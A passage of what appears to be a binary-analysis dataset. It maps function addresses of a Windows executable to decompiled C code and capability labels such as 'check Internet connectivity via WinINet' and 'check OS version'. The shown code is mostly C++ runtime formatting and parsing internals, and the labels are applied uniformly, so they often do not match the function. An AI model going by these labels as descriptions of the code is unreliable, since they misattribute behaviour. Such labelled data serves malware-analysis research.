0;\n                goto code_r0x0049ea41;\n            }\n            goto code_r0x0049ea99;\n        }\ncode_r0x0049ea29:\n        cVar4 = fcn.00403611();\n    }\n    if (cVar4 == '\\0') {\n        return 0;\n    }\n    if (*(param_1 + 0xc) != '\\0') {\n        return 1;\n    }\n    arg_ch = 0;\n    uStack8 = (uStack8 >> 0x10 & 0xff00) << 0x10;\n    uVar7 = param_1[8];\n    iStack12 = 0;\n    if ((uVar7 >> 4 & 1) != 0) {\n        uStack8._1_3_ = uStack8 >> 8;\n        if ((uVar7 >> 6 & 1) == 0) {\n            if ((uVar7 & 1) == 0) {\n                if ((uVar7 >> 1 & 1) != 0) {\n                    uStack8 = CONCAT31(uStack8._1_3_, 0x20);\n                    arg_ch = 1;\n                    iStack12 = 1;\n                }\n                goto code_r0x0049eb2b;\n            }\n            uStack8 = CONCAT31(uStack8._1_3_, 0x2b);\n        }\n        else {\n            uStack8 = CONCAT31(uStack8._1_3_, 0x2d);\n        }\n        iStack12 = 1;\n        arg_ch = 1;\n    }\ncode_r0x0049eb2b:\n    cVar4 = *(param_1 + 0x31);\n    if (((cVar4 == 'x') || (cVar4 == 'X')) && ((uVar7 >> 5 & 1) != 0)) {\n        bVar2 = true;\n    }\n    else {\n        bVar2 = false;\n    }\n    if ((cVar4 == 'a') || (cVar4 == 'A')) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((bVar2) || (bVar3)) {\n        *(&uStack8 + arg_ch) = 0x30;\n        if ((cVar4 == 'X') || (cVar4 == 'A')) {\n            uVar5 = 0x58;\n        }\n        else {\n            uVar5 = 0x78;\n        }\n        *(&uStack8 + arg_ch + 1) = uVar5;\n        arg_ch = arg_ch + 2;\n        iStack12 = arg_ch;\n    }\n    arg_14h = param_1 + 6;\n    arg_10h = (param_1[9] - param_1[0xe]) - arg_ch;\n    if ((*(param_1 + 8) & 0xc) == 0) {\n        fcn.00403f9e(param_1 + 0x112, 0x20, arg_10h, arg_14h);\n        arg_ch = iStack12;\n    }\n    fcn.004053da(&uStack8, arg_ch, arg_14h);\n    if (((param_1[8] >> 3 & 1) != 0) && ((param_1[8] >> 2 & 1) == 0)) {\n        fcn.00403f9e(param_1 + 0x112, 0x30, arg_10h, arg_14h);\n    }\n    fcn.0040547a(0);\n    if ((-1 < *arg_14h) && ((param_1[8] >> 2 & 1) != 0)) {\n        fcn.00403f9e(param_1 + 0x112, 0x20, arg_10h, arg_14h);\n    }\n    return 1;\n}\n",
        "token_count": 2369
    },
    "004032fb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004032fb(uint32_t arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    uint arg_ch_00;\n    int32_t in_ECX;\n    uint32_t uVar2;\n    char *arg_8h_00;\n    uint var_1ch;\n    uint var_8h;\n    \n    *(in_ECX + 0xc) = arg_8h & 0x17;\n    uVar2 = *(in_ECX + 0x10) & arg_8h & 0x17;\n    if (uVar2 != 0) {\n        if (arg_ch == '\\0') {\n            if ((uVar2 & 4) == 0) {\n                arg_8h_00 = \"ios_base::failbit set\";\n                if ((uVar2 & 2) == 0) {\n                    arg_8h_00 = \"ios_base::eofbit set\";\n                }\n            }\n            else {\n                arg_8h_00 = \"ios_base::badbit set\";\n            }\n            arg_ch_00 = fcn.00404372(&var_8h, 1);\n            fcn.004062f8();\n        }\n        else {\n            arg_ch_00 = 0;\n            arg_8h_00 = NULL;\n        }\n        fcn.004066d1(arg_8h_00, arg_ch_00);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    return;\n}\n",
        "token_count": 334
    },
    "00403332": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403332(int32_t **arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    \n    piVar1 = *arg_8h;\n    if ((*piVar1 == -0x1fbcbcae) || (*piVar1 == -0x1fbcb0b3)) {\n        iVar3 = fcn.00402ad6();\n        if (0 < *(iVar3 + 0x18)) {\n            iVar3 = fcn.00402ad6();\n            *(iVar3 + 0x18) = *(iVar3 + 0x18) + -1;\n        }\n    }\n    else if (*piVar1 == -0x1f928c9d) {\n        iVar3 = fcn.00402ad6();\n        *(iVar3 + 0x10) = piVar1;\n        piVar1 = arg_8h[1];\n        iVar3 = fcn.00402ad6();\n        *(iVar3 + 0x14) = piVar1;\n        fcn.0040106e();\n        pcVar2 = swi(3);\n        uVar4 = (*pcVar2)();\n        return uVar4;\n    }\n    return 0;\n}\n",
        "token_count": 288
    },
    "00403337": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403337(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    int32_t in_ECX;\n    uint32_t var_4h;\n    \n    piVar2 = *(in_ECX + 0xc);\n    if (piVar2 == NULL) {\n        piVar2 = fcn.004039a4();\n        *(in_ECX + 0xc) = piVar2;\n    }\n    iVar1 = *piVar2;\n    *piVar2 = 0;\n    var_4h = 0;\n    uVar3 = fcn.00403607(*(in_ECX + 0x10) + -2, &var_4h, 10);\n    *arg_8h = uVar3;\n    piVar4 = *(in_ECX + 0xc);\n    if (piVar4 == NULL) {\n        piVar4 = fcn.004039a4();\n        *(in_ECX + 0xc) = piVar4;\n    }\n    if ((*piVar4 == 0x22) || (var_4h < *(in_ECX + 0x10))) {\n        uVar3 = 0;\n    }\n    else {\n        *(in_ECX + 0x10) = var_4h;\n        uVar3 = 1;\n    }\n    if ((*piVar2 == 0) && (iVar1 != 0)) {\n        *piVar2 = iVar1;\n    }\n    return uVar3;\n}\n",
        "token_count": 354
    },
    "00403355": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_50h\n// WARNING: Variable defined which should be unmapped: var_4ch\n// WARNING: Variable defined which should be unmapped: var_48h\n// WARNING: Variable defined which should be unmapped: var_44h\n// WARNING: Variable defined which should be unmapped: var_40h\n\nvoid __cdecl\nfcn.00403355(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint noname_0;\n    uint arg_10h_00;\n    uint arg_14h_00;\n    char cVar3;\n    ushort uVar4;\n    uint *puVar5;\n    int32_t *piVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint uVar9;\n    int32_t iVar10;\n    int32_t unaff_EBP;\n    char *pcVar11;\n    int32_t iVar12;\n    uint32_t arg_1ch_00;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.0040536c(100);\n    uVar7 = *(unaff_EBP + 0x24);\n    iVar10 = *(unaff_EBP + 0x18);\n    pcVar11 = *(unaff_EBP + 0x20);\n    *(unaff_EBP + -0x70) = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x68) = iVar10;\n    *(unaff_EBP + -0x50) = uVar7;\n    if ((uVar7 == 0) || ((*pcVar11 != '+' && (*pcVar11 != '-')))) {\n        arg_1ch_00 = 0;\n    }\n    else {\n        arg_1ch_00 = 1;\n    }\n    if ((*(iVar10 + 0x14) & 0x3000) == 0x3000) {\n        uVar9 = 0x54d9fc;\n        if (((arg_1ch_00 + 2 <= uVar7) && (pcVar11[arg_1ch_00] == '0')) &&\n           ((pcVar11[arg_1ch_00 + 1] == 'x' || (pcVar11[arg_1ch_00 + 1] == 'X')))) {\n            arg_1ch_00 = arg_1ch_00 + 2;\n        }\n    }\n    else {\n        uVar9 = 0x54d9f8;\n    }\n    uVar9 = fcn.004026f8(pcVar11, uVar9);\n    *(unaff_EBP + -0x60) = uVar9;\n    *(unaff_EBP + -0x44) = 0x2e;\n    puVar5 = fcn.00401366();\n    *(unaff_EBP + -0x44) = **puVar5;\n    uVar9 = fcn.004026f8(pcVar11, unaff_EBP + -0x44);\n    *(unaff_EBP + -0x54) = uVar9;\n    fcn.0040327e(*(iVar10 + 0x30));\n    *(unaff_EBP + -4) = 0;\n    uVar9 = fcn.00403d87(unaff_EBP + -0x5c);\n    *(unaff_EBP + -4) = 0xffffffff;\n    *(unaff_EBP + -0x48) = uVar9;\n    fcn.004050a6();\n    fcn.004060c8(*(unaff_EBP + -0x50), 0);\n    iVar12 = unaff_EBP + -0x28;\n    *(unaff_EBP + -4) = 1;\n    if (7 < *(unaff_EBP + -0x14)) {\n        iVar12 = *(unaff_EBP + -0x28);\n    }\n    fcn.0040110e(pcVar11, pcVar11 + *(unaff_EBP + -0x50), iVar12);\n    fcn.0040327e(*(iVar10 + 0x30));\n    *(unaff_EBP + -4) = 2;\n    piVar6 = fcn.00404a89(unaff_EBP + -0x4c);\n    *(unaff_EBP + -4) = 1;\n    *(unaff_EBP + -0x58) = piVar6;\n    fcn.004050a6();\n    pcVar1 = *(*piVar6 + 0x14);\n    (**0x573000)(unaff_EBP + -0x40);\n    (*pcVar1)();\n    *(unaff_EBP + -4) = 3;\n    uVar7 = fcn.00405691();\n    iVar12 = *(unaff_EBP + -0x54);\n    uVar7 = uVar7 & 0xffff;\n    *(unaff_EBP + -0x48) = uVar7;\n    if (iVar12 == *(unaff_EBP + -0x50)) {\n        *(unaff_EBP + -0x54) = *(unaff_EBP + -0x60);\n    }\n    else {\n        uVar4 = fcn.00403afd();\n        iVar8 = unaff_EBP + -0x28;\n        if (7 < *(unaff_EBP + -0x14)) {\n            iVar8 = *(unaff_EBP + -0x28);\n        }\n        uVar7 = *(unaff_EBP + -0x48);\n        *(iVar8 + iVar12 * 2) = uVar4;\n    }\n    pcVar11 = unaff_EBP + -0x40;\n    if (0xf < *(unaff_EBP + -0x2c)) {\n        pcVar11 = *(unaff_EBP + -0x40);\n    }\n    cVar3 = *pcVar11;\n    if (cVar3 != '\\x7f') {\n        iVar10 = *(unaff_EBP + -0x54);\n        do {\n            if ((cVar3 < '\\x01') || (iVar10 - arg_1ch_00 <= cVar3)) break;\n            iVar10 = iVar10 - cVar3;\n            fcn.00404133(iVar10, 1, uVar7);\n            if ('\\0' < pcVar11[1]) {\n                pcVar11 = pcVar11 + 1;\n            }\n            cVar3 = *pcVar11;\n            uVar7 = *(unaff_EBP + -0x48);\n        } while (cVar3 != '\\x7f');\n        iVar10 = *(unaff_EBP + -0x68);\n    }\n    iVar12 = *(iVar10 + 0x24);\n    uVar7 = *(unaff_EBP + -0x18);\n    *(unaff_EBP + -0x68) = uVar7;\n    if ((iVar12 < 0) || (((iVar12 < 1 && (*(iVar10 + 0x20) == 0)) || (*(iVar10 + 0x20) <= uVar7)))) {\n        iVar12 = 0;\n    }\n    else {\n        iVar12 = *(iVar10 + 0x20) - uVar7;\n    }\n    uVar7 = *(iVar10 + 0x14) & 0x1c0;\n    if (uVar7 == 0x40) {\n        var_28h = unaff_EBP + -0x28;\n        if (7 < *(unaff_EBP + -0x14)) {\n            var_28h = *(unaff_EBP + -0x28);\n        }\n        var_2ch = *(unaff_EBP + 0x14);\n        uVar9 = *(unaff_EBP + 0x10);\n    }\n    else {\n        if (uVar7 == 0x100) {\n            iVar8 = unaff_EBP + -0x28;\n            if (7 < *(unaff_EBP + -0x14)) {\n                iVar8 = *(unaff_EBP + -0x28);\n            }\n            puVar5 = fcn.00402527(*(unaff_EBP + 8), unaff_EBP + -100, *(unaff_EBP + 0x10), *(unaff_EBP + 0x14), iVar8, \n                                  arg_1ch_00);\n            uVar9 = *puVar5;\n            uVar2 = puVar5[1];\n            *(unaff_EBP + 0x14) = uVar2;\n            *(unaff_EBP + 0x10) = uVar9;\n            puVar5 = fcn.00405a47(*(unaff_EBP + 8), unaff_EBP + -100, uVar9, uVar2, *(unaff_EBP + 0x1c), iVar12);\n            iVar12 = 0;\n            goto code_r0x0046c6b1;\n        }\n        puVar5 = fcn.00405a47(*(unaff_EBP + 8), unaff_EBP + -100, *(unaff_EBP + 0x10), *(unaff_EBP + 0x14), \n                              *(unaff_EBP + 0x1c), iVar12);\n        iVar12 = 0;\n        uVar9 = *puVar5;\n        var_2ch = puVar5[1];\n        var_28h = unaff_EBP + -0x28;\n        *(unaff_EBP + 0x10) = uVar9;\n        *(unaff_EBP + 0x14) = var_2ch;\n        if (7 < *(unaff_EBP + -0x14)) {\n            var_28h = *(unaff_EBP + -0x28);\n        }\n    }\n    puVar5 = fcn.00402527(*(unaff_EBP + 8), unaff_EBP + -100, uVar9, var_2ch, var_28h, arg_1ch_00);\ncode_r0x0046c6b1:\n    uVar9 = puVar5[1];\n    uVar2 = *puVar5;\n    *(unaff_EBP + 0x10) = uVar2;\n    *(unaff_EBP + 0x14) = uVar9;\n    *(unaff_EBP + -0x48) = unaff_EBP + -0x28;\n    if (7 < *(unaff_EBP + -0x14)) {\n        *(unaff_EBP + -0x48) = *(unaff_EBP + -0x28);\n    }\n    noname_0 = *(unaff_EBP + 8);\n    puVar5 = fcn.00402527(noname_0, unaff_EBP + -0x6c, uVar2, uVar9, *(unaff_EBP + -0x48) + arg_1ch_00 * 2, \n                          *(unaff_EBP + -0x68) - arg_1ch_00);\n    uVar9 = *(unaff_EBP + 0x1c);\n    uVar2 = *(unaff_EBP + -0x70);\n    arg_10h_00 = *puVar5;\n    arg_14h_00 = puVar5[1];\n    *(iVar10 + 0x20) = 0;\n    *(iVar10 + 0x24) = 0;\n    *(unaff_EBP + 0x10) = arg_10h_00;\n    *(unaff_EBP + 0x14) = arg_14h_00;\n    fcn.00405a47(noname_0, uVar2, arg_10h_00, arg_14h_00, uVar9, iVar12);\n    fcn.004029b9();\n    fcn.00402c34();\n    fcn.004067d0();\n    return;\n}\n",
        "token_count": 2875
    },
    "004033c3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004033c3(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        uVar3 = *(*(in_ECX + 0x14) + -4);\n        arg_8h[1] = 0;\n        *arg_8h = uVar3;\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.00403819(in_ECX + 0x464 + uVar1 * 0x10, 1, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        uVar3 = **(in_ECX + 0x46c + uVar1 * 0x10);\n        arg_8h[1] = 0;\n        *arg_8h = uVar3;\n    }\n    return 1;\n}\n",
        "token_count": 340
    },
    "004034d6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t * fcn.004034d6(uint32_t *param_1, uint param_2)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    uint32_t *puVar3;\n    int32_t *piVar4;\n    code *pcVar5;\n    char cVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int32_t *piVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    uchar *puVar12;\n    int32_t **in_FS_OFFSET;\n    bool bVar13;\n    ulong uVar14;\n    uint auStack92 [7];\n    uint32_t uStack64;\n    uint32_t uStack60;\n    int32_t iStack56;\n    uint32_t *puStack52;\n    uchar uStack48;\n    int32_t iStack44;\n    uint32_t uStack40;\n    uint32_t uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack92;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x41e220;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack64 = fcn.004061db(param_2);\n    uStack36 = *param_1;\n    iVar7 = *(uStack36 + 4);\n    uVar11 = *(param_1 + iVar7 + 0x20);\n    iVar2 = *(param_1 + iVar7 + 0x24);\n    uStack40 = uVar11 - uStack64;\n    iStack56 = iVar2 - (uVar11 < uStack64);\n    bVar13 = (SBORROW4(-iVar2, uVar11 != 0) != false) != -iVar2 - (uVar11 != 0) < 0 &&\n             (iVar2 != 0 || -iVar2 < (uStack64 < uVar11));\n    iStack44 = 0;\n    if (bVar13) {\n        iStack44 = iStack56;\n    }\n    uVar11 = 0;\n    if (bVar13) {\n        uVar11 = uStack40;\n    }\n    puStack52 = param_1;\n    piVar9 = *(param_1 + iVar7 + 0x38);\n    if (piVar9 != NULL) {\n        (**(*piVar9 + 4))();\n        uStack36 = *param_1;\n        iVar7 = *(uStack36 + 4);\n    }\n    if (*(param_1 + iVar7 + 0xc) != 0) {\n        uStack48 = 0;\n        uVar10 = 4;\n        puVar12 = &stack0xfffffffc;\n        goto code_r0x00416f6c;\n    }\n    puVar3 = *(param_1 + iVar7 + 0x3c);\n    if ((puVar3 == NULL) || (puVar3 == param_1)) {\n        uStack48 = true;\n        uVar8 = uStack36;\n    }\n    else {\n        uStack20 = 0;\n        uStack36 = uVar11;\n        fcn.0040303a();\n        uVar8 = *param_1;\n        uStack48 = *(param_1 + *(uVar8 + 4) + 0xc) == 0;\n        uVar10 = 4;\n        uVar11 = uStack36;\n        puVar12 = &stack0xfffffffc;\n        if (!uStack48) goto code_r0x00416f6c;\n    }\n    iVar7 = *(uVar8 + 4);\n    if (((*(param_1 + iVar7 + 0x14) & 0x1c0) != 0x40) &&\n       ((SBORROW4(iStack44, uVar11 == 0) != false) == iStack44 - (uVar11 == 0) < 0)) {\n        do {\n            piVar9 = *(param_1 + iVar7 + 0x38);\n            uVar1 = *(param_1 + iVar7 + 0x40);\n            piVar4 = piVar9[8];\n            puVar12 = *piVar4;\n            if (puVar12 == NULL) {\ncode_r0x00416e10:\n                uStack60 = 0;\n                uStack20 = 4;\n                iVar7 = (**(*piVar9 + 0xc))(uVar1);\n                if (iVar7 == -1) goto code_r0x00416f4a;\n            }\n            else {\n                iVar7 = *piVar9[0xc];\n                if (iVar7 < 1) goto code_r0x00416e10;\n                *piVar9[0xc] = iVar7 + -1;\n                *piVar4 = puVar12 + 1;\n                *puVar12 = uVar1;\n            }\n            if ((SBORROW4(iStack56, uStack40 < 2) != false) != iStack56 - (uStack40 < 2) < 0) goto code_r0x00416e5d;\n            bVar13 = uStack40 != 0;\n            uStack40 = uStack40 - 1;\n            iStack56 = iStack56 + -1 + bVar13;\n            iVar7 = *(*param_1 + 4);\n        } while( true );\n    }\ncode_r0x00416e77:\n    uStack36 = uVar11;\n    uStack60 = 0;\n    uStack20 = 4;\n    uVar14 = (**(**(param_1 + iVar7 + 0x38) + 0x24))(param_2, uStack64, 0);\n    uVar8 = uVar14 >> 0x20;\n    uVar11 = uVar14 ^ uStack64;\n    uVar10 = ((uVar11 | uVar8) != 0) << 2;\n    if (((uVar11 | uVar8) == 0) &&\n       (iVar7 = iStack44,  uVar11 = uStack36, \n       (SBORROW4(iStack44, uStack36 == 0) != false) == iStack44 - (uStack36 == 0) < 0)) {\n        do {\n            uStack40 = uVar10;\n            piVar9 = *(param_1 + *(*param_1 + 4) + 0x38);\n            uVar1 = *(param_1 + *(*param_1 + 4) + 0x40);\n            piVar4 = piVar9[8];\n            puVar12 = *piVar4;\n            iStack44 = iVar7;\n            uStack36 = uVar11;\n            if (puVar12 == NULL) {\ncode_r0x00416f27:\n                uStack60 = uStack40;\n                uStack20 = 4;\n                iVar7 = (**(*piVar9 + 0xc))(uVar1);\n                if (iVar7 == -1) goto code_r0x00416f4a;\n            }\n            else {\n                iVar7 = *piVar9[0xc];\n                if (iVar7 < 1) goto code_r0x00416f27;\n                *piVar9[0xc] = iVar7 + -1;\n                *piVar4 = puVar12 + 1;\n                *puVar12 = uVar1;\n            }\n            iVar7 = iStack44 + -1 + (uStack36 != 0);\n            uVar11 = uStack36 - 1;\n            uVar10 = uStack40;\n        } while ((SBORROW4(-iStack44, 1 < uStack36) != false) != -iStack44 - (1 < uStack36) < 0);\n    }\ncode_r0x00416f57:\n    iVar7 = *(*param_1 + 4);\n    *(param_1 + iVar7 + 0x24) = 0;\n    *(param_1 + iVar7 + 0x20) = 0;\n    puVar12 = &stack0xfffffffc;\ncode_r0x00416f6c:\n    while( true ) {\n        iVar7 = *(*param_1 + 4);\n        uVar11 = (uVar10 | *(param_1 + iVar7 + 0xc)) & 0x17 | (*(param_1 + iVar7 + 0x38) == 0) << 2;\n        *(param_1 + iVar7 + 0xc) = uVar11;\n        if ((uVar11 & *(param_1 + iVar7 + 0x10)) == 0) break;\n        fcn.00404372(puVar12 + -0x44, 1);\n        auStack92[0] = *(puVar12 + -0x44);\n        *(puVar12 + -0x10) = 3;\n        fcn.00405ed4();\n        *(puVar12 + -0x58) = vtable.std::ios_base::failure.0;\n        fcn.004066d1(puVar12 + -0x58, 0x560cfc);\n        uVar10 = *(puVar12 + -0x2c);\n        param_1 = *(puVar12 + 0x14);\n        puVar12 = puVar12 + 0xc;\n    }\n    cVar6 = fcn.00402108();\n    if (cVar6 == '\\0') {\n        *(puVar12 + -0x10) = 2;\n        *(puVar12 + -0x24) = *(puVar12 + -0x30);\n        fcn.00405443();\n        param_1 = *(puVar12 + 8);\n        piVar9 = *(puVar12 + -0x24);\n    }\n    else {\n        piVar9 = *(puVar12 + -0x30);\n    }\n    piVar9 = *(piVar9 + *(*piVar9 + 4) + 0x38);\n    if (piVar9 != NULL) {\n        pcVar5 = *(*piVar9 + 8);\n        *(puVar12 + -0x10) = 1;\n        (*pcVar5)();\n        param_1 = *(puVar12 + 8);\n    }\n    *in_FS_OFFSET = *(puVar12 + -0x18);\n    return param_1;\ncode_r0x00416e5d:\n    iVar7 = *(*param_1 + 4);\n    uStack36 = 0;\n    iStack44 = 0;\n    uVar11 = uStack36;\n    goto code_r0x00416e77;\ncode_r0x00416f4a:\n    uVar10 = 4;\n    goto code_r0x00416f57;\n}\n",
        "token_count": 2390
    },
    "004034db": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.004034db(uint *arg_8h, int32_t arg_ch)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00402cfc(arg_ch * 8 + 0x54ebb8);\n    pcVar1 = *0x56f458 + 1;\n    if ((**0x56f458 != '@') || (pcVar1 = *0x56f458 + 2,  (*0x56f458)[1] != '_')) {\n        *0x56f458 = pcVar1;\n        arg_8h[1] = 0;\n        *arg_8h = 0;\n        *(arg_8h + 1) = 2;\n        return arg_8h;\n    }\n    *0x56f458 = *0x56f458 + 3;\n    fcn.00403535(&var_10h, 0);\n    fcn.00403535(&var_10h, 0);\n    cVar2 = **0x56f458;\n    if (cVar2 != '\\0') {\n        do {\n            if (cVar2 == '@') break;\n            *0x56f458 = *0x56f458 + 1;\n            cVar2 = **0x56f458;\n        } while (cVar2 != '\\0');\n        if (**0x56f458 != '\\0') {\n            *0x56f458 = *0x56f458 + 1;\n            *arg_8h = var_8h;\n            arg_8h[1] = var_4h;\n            return arg_8h;\n        }\n    }\n    *0x56f458 = *0x56f458 + -1;\n    fcn.004017df(1);\n    return arg_8h;\n}\n",
        "token_count": 427
    },
    "004034ea": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004034ea(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.004037c9();\n    iVar1 = *0x56ec1c;\n    if ((iVar2 != 0) && (arg_8h == '\\0')) {\n        *0x56ec1c = 0;\n        iVar2 = iVar1;\n    }\n    return iVar2;\n}\n",
        "token_count": 105
    },
    "0040350d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040350d(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t in_ECX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *(in_ECX + 0x48) = arg_ch == 1;\n    *(in_ECX + 0x3d) = 0;\n    fcn.004021f8();\n    if (arg_8h != 0) {\n        var_4h = 0;\n        var_8h = 0;\n        var_ch = 0;\n        fcn.00403f94(arg_8h, &var_4h, &var_8h, &var_ch);\n        *(in_ECX + 0xc) = var_4h;\n        *(in_ECX + 0x10) = var_4h;\n        *(in_ECX + 0x1c) = var_8h;\n        *(in_ECX + 0x20) = var_8h;\n        *(in_ECX + 0x2c) = var_ch;\n        *(in_ECX + 0x30) = var_ch;\n    }\n    *(in_ECX + 0x4c) = arg_8h;\n    uVar2 = *0x56f114;\n    uVar1 = *0x56f110;\n    *(in_ECX + 0x38) = 0;\n    *(in_ECX + 0x40) = uVar1;\n    *(in_ECX + 0x44) = uVar2;\n    return;\n}\n",
        "token_count": 369
    },
    "00403535": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * __cdecl fcn.00403535(uint *arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    uint *puVar4;\n    bool bVar5;\n    int32_t var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    uint var_18h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    bVar5 = **0x56f458 != 'Q';\n    if (!bVar5) {\n        *0x56f458 = *0x56f458 + 1;\n    }\n    cVar1 = **0x56f458;\n    if (cVar1 == '\\0') {\n        fcn.004017df(1);\n        return arg_8h;\n    }\n    if ((cVar1 < '0') || ('9' < cVar1)) {\n        fcn.00401906(&var_28h);\n        if (var_20h == '\\0') {\n            if (**0x56f458 != '\\0') {\n                uVar3 = 0;\n                var_4h = 2;\n                var_8h = 0;\n                puVar4 = &var_8h;\n                goto code_r0x0048d0dd;\n            }\n            puVar4 = fcn.004017df(1);\n        }\n        else {\n            *0x56f458 = *0x56f458 + 1;\n            if (arg_ch == '\\0') {\n                if (bVar5) goto code_r0x0048d062;\n                goto code_r0x0048d02a;\n            }\n            if (!bVar5) {\n                uVar3 = fcn.004049a8(var_28h, var_24h);\n                goto code_r0x0048d02f;\n            }\n            puVar4 = fcn.004049a8(var_28h, var_24h);\n        }\n    }\n    else {\n        uVar2 = cVar1;\n        if (bVar5) {\n            var_28h = uVar2 - 0x2f;\n            var_24h = (uVar2 >> 0x1f) + -1 + (0x2e < uVar2);\n            *0x56f458 = *0x56f458 + 1;\ncode_r0x0048d062:\n            puVar4 = fcn.0040128a(var_28h, var_24h);\n        }\n        else {\n            var_28h = uVar2 - 0x2f;\n            *0x56f458 = *0x56f458 + 1;\n            var_24h = var_28h >> 0x1f;\ncode_r0x0048d02a:\n            uVar3 = fcn.0040128a(var_28h, var_24h);\ncode_r0x0048d02f:\n            fcn.00402cfc(0x56cce0);\n            fcn.004052f9(&var_8h, uVar3);\n            puVar4 = &var_8h;\n        }\n    }\n    uVar3 = 